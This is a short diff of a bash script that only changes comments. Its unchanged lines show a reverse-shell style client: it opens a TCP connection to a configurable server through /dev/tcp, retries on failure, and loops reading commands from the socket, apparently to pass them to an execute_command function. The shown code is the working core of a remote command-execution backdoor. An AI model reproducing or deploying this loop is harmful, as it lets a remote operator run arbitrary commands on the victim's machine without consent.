@@ -34,7 +34,7 @@ execute_command() {
 
 # Main connection loop
 while [[ $RETRIES -lt $MAX_RETRIES ]]; do
-    # Establish TCP connection
+    # Open a TCP connection
     exec 3<>/dev/tcp/$SERVER/$PORT
     if [[ $? -ne 0 ]]; then
         RETRIES=$((RETRIES + 1))
@@ -52,6 +52,7 @@ while [[ $RETRIES -lt $MAX_RETRIES ]]; do
 
     # Listen for commands
     while true; do
+        # Read command from server
         if ! read -r -u 3 COMMAND; then
             echo "[-] Connection lost. Reconnecting..."
             break
